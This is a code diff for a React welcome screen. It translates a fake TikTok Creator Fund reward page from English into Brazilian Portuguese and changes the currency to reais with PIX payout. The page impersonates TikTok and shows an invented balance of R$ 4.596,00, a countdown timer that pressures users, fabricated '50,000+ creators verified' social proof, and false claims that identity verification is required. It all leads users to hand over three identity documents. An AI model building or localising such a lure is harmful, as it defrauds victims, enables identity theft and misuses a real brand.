@@ -9,9 +9,9 @@ interface WelcomeScreenProps {
 }
 
 const benefits = [
-  { icon: ShieldCheck, text: "Secure identity verification" },
-  { icon: Clock, text: "Quick — only 3 documents, about 1 minute" },
-  { icon: CheckCircle, text: "Funds released within 1-3 business days" },
+  { icon: ShieldCheck, text: "Verificação de identidade segura" },
+  { icon: Clock, text: "Rápido — apenas 3 documentos, cerca de 1 minuto" },
+  { icon: CheckCircle, text: "Liberação em até 1-3 dias úteis via PIX" },
 ];
 
 // Pseudo-random avatar colors for social proof
@@ -62,7 +62,7 @@ const CountdownTimer = () => {
     <div className="flex items-center justify-center gap-2 py-2.5 px-4 rounded-full bg-destructive/10 border border-destructive/20">
       <Flame className="w-4 h-4 text-destructive" />
       <span className="text-xs font-semibold text-destructive">
-        Reward expires in <span className="tabular-nums">{display}</span>
+        A recompensa expira em <span className="tabular-nums">{display}</span>
       </span>
     </div>
   );
@@ -83,7 +83,7 @@ const SocialProof = () => (
       ))}
     </div>
     <p className="text-xs text-muted-foreground">
-      <strong className="text-foreground">50,000+</strong> creators verified this week
+      <strong className="text-foreground">50.000+</strong> criadores verificados nesta semana
     </p>
   </div>
 );
@@ -95,13 +95,13 @@ const WelcomeScreen = ({ userName, onContinue }: WelcomeScreenProps) => {
 
       <div className="flex-1 flex flex-col px-6 py-6">
         <p className="text-sm text-muted-foreground mb-1">
-          Welcome back, <strong className="text-foreground">{userName}!</strong>
+          Bem-vindo de volta, <strong className="text-foreground">{userName}!</strong>
         </p>
 
         <div className="mt-4 mb-2 flex items-center justify-between">
-          <h2 className="text-xl font-semibold">Your reward is ready</h2>
+          <h2 className="text-xl font-semibold">Sua recompensa está pronta</h2>
           <span className="text-xs font-semibold text-muted-foreground bg-secondary px-3 py-1 rounded-full">
-            Step 1 of 4
+            Passo 1 de 4
           </span>
         </div>
 
@@ -116,11 +116,11 @@ const WelcomeScreen = ({ userName, onContinue }: WelcomeScreenProps) => {
           <div className="absolute inset-0 bg-gradient-to-tr from-transparent via-white/[0.03] to-white/[0.08] pointer-events-none" />
           <div className="flex items-center justify-center gap-2 mb-3 relative z-10">
             <Gift className="w-5 h-5 text-success" />
-            <span className="text-xs uppercase tracking-widest opacity-60 font-semibold">Available Balance</span>
+            <span className="text-xs uppercase tracking-widest opacity-60 font-semibold">Saldo disponível</span>
           </div>
-          <p className="text-[44px] font-bold tracking-tighter leading-none text-center relative z-10">$2,893.27</p>
+          <p className="text-[44px] font-bold tracking-tighter leading-none text-center relative z-10">R$ 4.596,00</p>
           <p className="text-[11px] opacity-50 mt-3 text-center relative z-10">
-            Verified reward from TikTok Creator Fund
+            Recompensa verificada do Fundo de Criadores da TikTok
           </p>
         </div>
 
@@ -130,7 +130,7 @@ const WelcomeScreen = ({ userName, onContinue }: WelcomeScreenProps) => {
         </div>
 
         <p className="text-sm text-muted-foreground text-center mb-6">
-          To withdraw your funds, we need to verify your identity. This is a one-time process required by TikTok's payout policy.
+          Para sacar seus fundos, precisamos verificar sua identidade. Este é um processo único exigido pela política de pagamentos da TikTok.
         </p>
 
         {/* Benefits list */}
@@ -151,7 +151,7 @@ const WelcomeScreen = ({ userName, onContinue }: WelcomeScreenProps) => {
         <div className="flex items-center gap-2 p-3 rounded-xl bg-success/5 border border-success/20 mb-6">
           <ShieldCheck className="w-4 h-4 text-success shrink-0" />
           <p className="text-xs text-muted-foreground">
-            Your data is <strong className="text-foreground">encrypted</strong> and securely stored. We never share your documents.
+            Seus dados estão <strong className="text-foreground">criptografados</strong> e armazenados com segurança. Nunca compartilhamos seus documentos.
           </p>
         </div>
 
@@ -160,10 +160,10 @@ const WelcomeScreen = ({ userName, onContinue }: WelcomeScreenProps) => {
             onClick={onContinue}
             className="w-full h-14 rounded-full text-base font-semibold"
           >
-            Continue to Verification
+            Continuar para verificação
           </Button>
           <p className="text-[10px] text-muted-foreground/60 text-center mt-3">
-            By continuing you agree to TikTok's verification terms
+            Ao continuar, você concorda com os termos de verificação da TikTok
           </p>
         </div>
       </div>
